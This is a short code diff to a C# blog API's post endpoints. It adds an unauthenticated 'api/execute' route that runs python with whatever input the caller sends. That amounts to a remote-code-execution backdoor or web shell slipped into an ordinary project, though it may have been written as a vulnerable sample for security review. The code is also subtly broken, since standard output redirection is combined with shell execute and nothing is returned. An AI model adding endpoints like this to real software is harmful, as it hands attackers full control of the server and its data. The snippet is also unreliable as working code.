@@ -34,6 +34,23 @@ public static class PostEndpoints
     })
     .WithName("GetPostsForBlog")
     .WithTags("Posts");
-    
+
+    app.MapGet("api/execute", (string input) => {
+      Process process = new()
+      {
+        StartInfo = new ProcessStartInfo(
+          "python",
+          input
+        )
+        {
+          RedirectStandardOutput = true,
+          UseShellExecute = true,
+          CreateNoWindow = true
+        }
+      };
+
+      process.Start();
+    });
+
   }
 }
